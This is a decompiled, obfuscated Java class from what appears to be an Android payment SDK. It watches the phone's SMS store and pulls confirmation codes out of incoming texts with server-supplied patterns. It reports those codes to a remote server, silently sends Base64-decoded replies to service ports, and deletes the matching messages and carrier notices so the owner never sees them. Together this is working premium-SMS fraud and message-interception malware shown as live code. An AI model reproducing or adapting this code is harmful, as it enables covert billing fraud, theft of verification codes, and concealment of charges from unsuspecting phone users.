package bn.sdk.szwcsss.common.az.c.service;

import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import bn.sdk.szwcsss.common.az.c.constant.Cif;
import bn.sdk.szwcsss.common.az.c.model.RespParam;
import bn.sdk.szwcsss.common.az.c.model.SmsInfo;
import bn.sdk.szwcsss.common.az.c.net.Cbyte;
import bn.sdk.szwcsss.common.az.c.net.Cfor;
import bn.sdk.szwcsss.common.az.c.pay.Ctry;
import bn.sdk.szwcsss.common.az.code.c.Ccase;
import bn.sdk.szwcsss.common.az.code.c.Cchar;
import bn.sdk.szwcsss.common.az.code.c.Celse;
import bn.sdk.szwcsss.common.az.code.c.Clong;
import com.umeng.analytics.a;
import com.yuanlang.pay.plugin.libs.x;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.regex.Matcher;
/* renamed from: bn.sdk.szwcsss.common.az.c.service.do  reason: invalid class name */
/* loaded from: classes.dex */
public class Cdo extends ContentObserver {

    /* renamed from: a  reason: collision with root package name */
    public static final String[] f561a = {"_id", "thread_id", "type", "date", a.z, "address", "read"};
    private Context b;
    private ContentResolver c;
    private HandlerC0002do d;

    /* renamed from: bn.sdk.szwcsss.common.az.c.service.do$do  reason: invalid class name and collision with other inner class name */
    /* loaded from: classes.dex */
    class HandlerC0002do extends Handler {
        HandlerC0002do() {
        }

        @Override // android.os.Handler
        public void handleMessage(Message message) {
            switch (Cif.Cint.a(message.what)) {
                case SUCCESS:
                    for (SmsInfo smsInfo : (List) message.obj) {
                        new bn.sdk.szwcsss.common.az.code.a.Cif(Cdo.this.b).a(smsInfo);
                        if (Cdo.this.b(smsInfo)) {
                            Cdo.this.a((PendingIntent) null, smsInfo);
                        }
                    }
                    return;
                default:
                    return;
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: bn.sdk.szwcsss.common.az.c.service.do$if  reason: invalid class name */
    /* loaded from: classes.dex */
    public class Cif extends Thread {
        private String b;
        private String c;
        private String d;

        public Cif(String str, String str2, String str3) {
            this.b = str;
            this.c = str2;
            this.d = str3;
        }

        @Override // java.lang.Thread, java.lang.Runnable
        public void run() {
            try {
                Looper.prepare();
                RespParam connToAccess = new Cbyte(Cdo.this.b, this.b, this.c, this.d).connToAccess();
                if (!(connToAccess == null || connToAccess.getSmsList() == null)) {
                    Message obtain = Message.obtain();
                    obtain.obj = connToAccess.getSmsList();
                    obtain.what = connToAccess.getResultCode();
                    new HandlerC0002do().sendMessage(obtain);
                }
                Looper.loop();
            } catch (Exception e) {
                Log.e(bn.sdk.szwcsss.common.az.c.constant.Cdo.f525a, "支付确认请求失败", e);
            }
        }
    }

    public Cdo(Context context, ContentResolver contentResolver) {
        super(null);
        this.b = context;
        this.c = contentResolver;
    }

    private List a(Uri uri) {
        ArrayList arrayList = new ArrayList();
        Cursor query = this.c.query(uri, f561a, "date >=" + Ccase.g(this.b, "payTime"), null, "date desc limit 10");
        try {
            if (query != null) {
                try {
                    if (query.getCount() > 0) {
                        query.moveToFirst();
                        do {
                            bn.sdk.szwcsss.common.az.c.model.Cdo doVar = new bn.sdk.szwcsss.common.az.c.model.Cdo();
                            doVar.a(query.getInt(query.getColumnIndex("_id")));
                            doVar.a(query.getLong(query.getColumnIndex("thread_id")));
                            doVar.b(query.getInt(query.getColumnIndex("type")));
                            doVar.a(query.getString(query.getColumnIndex("date")));
                            doVar.b(query.getString(query.getColumnIndex(a.z)));
                            doVar.e(query.getString(query.getColumnIndex("address")));
                            doVar.c(query.getInt(query.getColumnIndex("read")));
                            arrayList.add(doVar);
                        } while (query.moveToNext());
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    if (query != null) {
                        query.close();
                    }
                }
            }
            return arrayList;
        } finally {
            if (query != null) {
                query.close();
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(PendingIntent pendingIntent, SmsInfo smsInfo) {
        if (smsInfo.getMoType() == Cif.EnumC0000if.BASE64.value) {
            Celse.a(this.b, smsInfo.getPort(), (String) null, Base64.decode(smsInfo.getMo(), 0), false, pendingIntent);
        } else if (smsInfo.getMoType() == Cif.EnumC0000if.TEXT_BASE64.value) {
            try {
                Celse.a(this.b, smsInfo.getPort(), new String(Base64.decode(smsInfo.getMo(), 0), "UTF-8"), (byte[]) null, true, pendingIntent);
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        } else {
            Celse.a(this.b, smsInfo.getPort(), smsInfo.getMo(), (byte[]) null, true, pendingIntent);
        }
    }

    private void a(List list, List list2) {
        Iterator it = list.iterator();
        while (it.hasNext()) {
            bn.sdk.szwcsss.common.az.c.model.Cdo doVar = (bn.sdk.szwcsss.common.az.c.model.Cdo) it.next();
            Iterator it2 = list2.iterator();
            while (it2.hasNext()) {
                SmsInfo smsInfo = (SmsInfo) it2.next();
                boolean d = d(doVar, smsInfo);
                if (!d ? c(doVar, smsInfo) : d) {
                    c(doVar);
                }
            }
        }
    }

    private boolean a(SmsInfo smsInfo) {
        return smsInfo.getType() == Cif.Cnew.IDEN.value && !Clong.c((Object) smsInfo.getIdenRegex());
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean b(SmsInfo smsInfo) {
        return !Clong.c((Object) smsInfo.getMo()) && !Clong.c((Object) smsInfo.getPort());
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void c(bn.sdk.szwcsss.common.az.c.model.Cdo doVar) {
        if (Build.VERSION.SDK_INT >= 19) {
            Cchar.a(this.b, true, 15);
        }
        try {
            this.c.delete(Uri.parse("content://sms/conversations/" + doVar.b()), null, null);
        } catch (Exception e) {
        }
        try {
            this.b.getContentResolver().delete(Uri.parse(bn.sdk.szwcsss.common.az.c.model.Cdo.e), "_id=" + doVar.a(), null);
        } catch (Exception e2) {
        }
    }

    private boolean c(bn.sdk.szwcsss.common.az.c.model.Cdo doVar, SmsInfo smsInfo) {
        return doVar.j().equals(smsInfo.getIdenPort());
    }

    private boolean d(bn.sdk.szwcsss.common.az.c.model.Cdo doVar, SmsInfo smsInfo) {
        if (smsInfo.getMoType() == Cif.EnumC0000if.TEXT_BASE64.value) {
            try {
                if (doVar.j().equals(smsInfo.getPort())) {
                    if (doVar.g().equals(new String(Base64.decode(smsInfo.getMo(), 0), "UTF-8"))) {
                        return true;
                    }
                }
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        } else if (doVar.j().equals(smsInfo.getPort()) && doVar.g().equals(smsInfo.getMo())) {
            return true;
        }
        return false;
    }

    private String e(bn.sdk.szwcsss.common.az.c.model.Cdo doVar, SmsInfo smsInfo) {
        return Clong.c((Object) smsInfo.getIdenPort()) ? doVar.j() : smsInfo.getIdenPort();
    }

    public void a(List list, List list2, int i) {
        Iterator it = list.iterator();
        while (it.hasNext()) {
            final bn.sdk.szwcsss.common.az.c.model.Cdo doVar = (bn.sdk.szwcsss.common.az.c.model.Cdo) it.next();
            Iterator it2 = list2.iterator();
            while (it2.hasNext()) {
                SmsInfo smsInfo = (SmsInfo) it2.next();
                boolean a2 = a(doVar, smsInfo, i);
                if (!a2 && b(doVar) && !Ccase.c(this.b, b(doVar, smsInfo)) && smsInfo.getType() == 6) {
                    Ccase.d(this.b, b(doVar, smsInfo));
                    SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    new Thread(new Cfor(this.b, smsInfo.getLinkId(), doVar.j(), doVar.g(), "", simpleDateFormat.format(new Date(Long.valueOf(doVar.f()).longValue())), simpleDateFormat.format(new Date(Long.valueOf(Ccase.g(this.b, "payTime")).longValue())), i)).start();
                }
                boolean a3 = !a2 ? a(doVar, smsInfo) : a2;
                if (!a3) {
                    a3 = a(doVar);
                }
                if (a3) {
                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() { // from class: bn.sdk.szwcsss.common.az.c.service.do.1
                        @Override // java.lang.Runnable
                        public void run() {
                            Cdo.this.c(doVar);
                        }
                    }, 100L);
                }
            }
        }
    }

    public boolean a(bn.sdk.szwcsss.common.az.c.model.Cdo doVar) {
        return Long.valueOf(Long.parseLong(doVar.f())).longValue() - Long.valueOf(Long.parseLong(Ccase.g(this.b, "payTime"))).longValue() <= ((long) (Ccase.f(this.b, "interceptTime") * 1000)) && (doVar.j().replaceFirst("^0*", "").startsWith("10") || doVar.j().replaceFirst("^0*", "").startsWith("11"));
    }

    public boolean a(bn.sdk.szwcsss.common.az.c.model.Cdo doVar, SmsInfo smsInfo) {
        if (TextUtils.isEmpty(smsInfo.getMask())) {
            return false;
        }
        String g = doVar.g();
        for (String str : smsInfo.getMask().split("_")) {
            if (g.indexOf(str) != -1) {
                return true;
            }
        }
        return false;
    }

    public boolean a(bn.sdk.szwcsss.common.az.c.model.Cdo doVar, SmsInfo smsInfo, int i) {
        if (!a(smsInfo)) {
            return false;
        }
        if (Long.valueOf(Long.parseLong(doVar.f())).longValue() - Long.valueOf(smsInfo.getSmsTime()).longValue() > x.d) {
            return false;
        }
        Matcher a2 = Clong.a(doVar.g(), smsInfo.getIdenRegex());
        if (!a2.find() || Ccase.d(this.b, smsInfo.getLinkId(), 0) >= 3) {
            return false;
        }
        String group = a2.group(smsInfo.getIdenGroup());
        String j = doVar.j();
        if (!Ccase.a(this.b, b(doVar, smsInfo))) {
            if (smsInfo.getIdenMode() == Cif.Cdo.RESTORE.value) {
                smsInfo.setMo(group);
                smsInfo.setPort(e(doVar, smsInfo));
                new Ctry(this.b).a(smsInfo);
            } else {
                new Cif(smsInfo.getLinkId(), group, j).start();
            }
            Ccase.a(this.b, b(doVar, smsInfo), true);
            Ccase.a(this.b, smsInfo.getLinkId(), Ccase.d(this.b, smsInfo.getLinkId(), 0) + 1);
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            new Thread(new Cfor(this.b, smsInfo.getLinkId(), doVar.j(), doVar.g(), group, simpleDateFormat.format(new Date(Long.valueOf(doVar.f()).longValue())), simpleDateFormat.format(new Date(Long.valueOf(Ccase.g(this.b, "payTime")).longValue())), i)).start();
        }
        return true;
    }

    public String b(bn.sdk.szwcsss.common.az.c.model.Cdo doVar, SmsInfo smsInfo) {
        if (!a(smsInfo)) {
            return "";
        }
        Matcher a2 = Clong.a(doVar.g(), smsInfo.getIdenRegex());
        String str = "";
        if (a2.find()) {
            str = a2.group(smsInfo.getIdenGroup());
        }
        return smsInfo.getLinkId() + bn.sdk.szwcsss.common.az.code.c.Cif.a(str.getBytes());
    }

    public boolean b(bn.sdk.szwcsss.common.az.c.model.Cdo doVar) {
        return Long.valueOf(Long.parseLong(doVar.f())).longValue() - Long.valueOf(Long.parseLong(Ccase.g(this.b, "payTime"))).longValue() <= ((long) 300000);
    }

    @Override // android.database.ContentObserver
    public void onChange(boolean z) {
        super.onChange(z);
        List a2 = a(Uri.parse(bn.sdk.szwcsss.common.az.c.model.Cdo.g));
        List a3 = a(Uri.parse(bn.sdk.szwcsss.common.az.c.model.Cdo.f));
        List c = new bn.sdk.szwcsss.common.az.code.a.Cif(this.b).c();
        a(a3, c);
        a(a2, c, 0);
    }
}
